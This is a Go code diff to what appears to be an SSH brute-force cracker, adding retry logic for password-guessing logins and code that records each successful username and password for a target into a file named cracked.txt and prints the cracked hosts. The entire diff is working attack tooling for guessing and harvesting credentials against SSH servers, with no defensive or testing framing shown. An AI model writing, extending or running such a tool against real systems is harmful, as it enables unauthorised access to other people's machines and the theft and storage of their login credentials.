@@ -3,6 +3,7 @@ package main
 import (
 	"context"
 	"fmt"
+	"os"
 	"runtime"
 	"strings"
 	"sync"
@@ -124,8 +125,8 @@ func (wp *WorkerPool) worker(id int) {
 				continue
 			}
 
-			// Process the job
-			success, err := wp.trySSHLogin(job)
+			// Process the job with retry logic
+			success, err := wp.trySSHLoginWithRetry(job)
 
 			// Release connection slot
 			wp.releaseConnection(job.Target)
@@ -229,6 +230,8 @@ func (wp *WorkerPool) collectResults() {
 		// Print success immediately (these are important)
 		if result.Success {
 			fmt.Printf("SUCCESS: %s:%s@%s\n", result.Job.Username, result.Job.Password, result.Job.Target)
+			// Export successful login to cracked.txt
+			wp.exportCrackedHost(result.Job)
 		}
 	}
 }
@@ -277,6 +280,14 @@ func (wp *WorkerPool) printResults() {
 	fmt.Printf("Time elapsed: %v\n", elapsed.Round(time.Second))
 	fmt.Printf("Average rate: %.1f attempts/second\n", rate)
 
+	// Print export information
+	if wp.successCount > 0 {
+		fmt.Printf("\n=== EXPORT ===\n")
+		fmt.Printf("Successfully cracked hosts exported to: cracked.txt\n")
+		fmt.Printf("Format: ip:port username:password\n")
+		wp.displayCrackedHosts()
+	}
+
 	// Print failed IPs statistics
 	wp.printFailedIPsStats()
 }
@@ -292,8 +303,12 @@ func (wp *WorkerPool) printFailedIPsStats() {
 
 	fmt.Printf("\n=== FAILED IPs STATISTICS ===\n")
 	for ip, info := range wp.failedIPs {
-		fmt.Printf("IP: %s | Failures: %d | Last Fail: %v\n",
-			ip, info.FailCount, info.LastFail.Format("15:04:05"))
+		status := "ACTIVE"
+		if info.FailCount >= wp.limits.MaxRetries {
+			status = "BLOCKED"
+		}
+		fmt.Printf("IP: %s | Failures: %d/%d | Status: %s | Last Fail: %v\n",
+			ip, info.FailCount, wp.limits.MaxRetries, status, info.LastFail.Format("15:04:05"))
 	}
 }
 
@@ -394,8 +409,8 @@ func (wp *WorkerPool) isIPFailed(target string) bool {
 		return false
 	}
 
-	// Check if IP has failed too many times (configurable threshold)
-	return info.FailCount >= 5
+	// Check if IP has failed more than max retries
+	return info.FailCount >= wp.limits.MaxRetries
 }
 
 // recordFailedIP records a failed attempt for an IP
@@ -454,4 +469,82 @@ func (wp *WorkerPool) releaseConnection(target string) {
 	default:
 		// Semaphore was already empty, shouldn't happen
 	}
+}
+
+// exportCrackedHost exports a successfully cracked host to cracked.txt
+func (wp *WorkerPool) exportCrackedHost(job Job) {
+	// Format: ip:port username:password
+	crackedEntry := fmt.Sprintf("%s %s:%s\n", job.Target, job.Username, job.Password)
+
+	// Open file in append mode
+	file, err := os.OpenFile("cracked.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		fmt.Printf("Error opening cracked.txt: %v\n", err)
+		return
+	}
+	defer file.Close()
+
+	// Write the entry
+	if _, err := file.WriteString(crackedEntry); err != nil {
+		fmt.Printf("Error writing to cracked.txt: %v\n", err)
+		return
+	}
+
+	// Flush to ensure immediate write
+	file.Sync()
+
+	fmt.Printf("Exported to cracked.txt: %s %s:%s\n", job.Target, job.Username, job.Password)
+}
+
+// trySSHLoginWithRetry attempts SSH login with retry logic
+func (wp *WorkerPool) trySSHLoginWithRetry(job Job) (bool, error) {
+	var lastErr error
+
+	for attempt := 1; attempt <= wp.limits.MaxRetries; attempt++ {
+		success, err := wp.trySSHLogin(job)
+
+		if success {
+			return true, nil
+		}
+
+		lastErr = err
+
+		// If this is not the last attempt, wait before retrying
+		if attempt < wp.limits.MaxRetries {
+			// Check if we should continue (context not cancelled)
+			select {
+			case <-wp.ctx.Done():
+				return false, fmt.Errorf("context cancelled")
+			case <-time.After(wp.limits.RetryDelay):
+				// Continue to next attempt
+			}
+		}
+	}
+
+	return false, fmt.Errorf("failed after %d attempts: %v", wp.limits.MaxRetries, lastErr)
+}
+
+// displayCrackedHosts displays the contents of cracked.txt
+func (wp *WorkerPool) displayCrackedHosts() {
+	file, err := os.Open("cracked.txt")
+	if err != nil {
+		fmt.Printf("Error reading cracked.txt: %v\n", err)
+		return
+	}
+	defer file.Close()
+
+	// Read file contents
+	content, err := os.ReadFile("cracked.txt")
+	if err != nil {
+		fmt.Printf("Error reading cracked.txt: %v\n", err)
+		return
+	}
+
+	if len(content) == 0 {
+		fmt.Printf("No cracked hosts found in cracked.txt\n")
+		return
+	}
+
+	fmt.Printf("\nCracked hosts:\n")
+	fmt.Printf("%s", string(content))
 }
